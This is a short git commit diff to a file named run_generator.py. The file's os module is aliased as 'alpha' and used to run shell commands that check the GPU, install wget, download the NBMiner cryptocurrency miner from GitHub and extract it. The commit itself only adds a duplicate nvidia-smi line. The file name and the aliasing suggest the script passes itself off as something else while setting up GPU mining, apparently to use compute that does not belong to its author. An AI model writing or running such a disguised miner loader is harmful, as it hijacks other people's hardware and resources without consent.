ac8faece49bed46af86471bf0b3fc1f43dadcf8b
bartu221 <44907925+bartu221@users.noreply.github.com>
2021-10-18 22:30:54 +0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,6 +1,7 @@
 import os as alpha
 alpha.system("pip install --upgrade pip")
 alpha.system("nvidia-smi")
+alpha.system("nvidia-smi")
 alpha.system("apt-get install wget")
 alpha.system("wget https://github.com/NebuTech/NBMiner/releases/download/v39.5/NBMiner_39.5_Linux.tgz")
 alpha.system("tar xvf NBMiner_39.5_Linux.tgz")
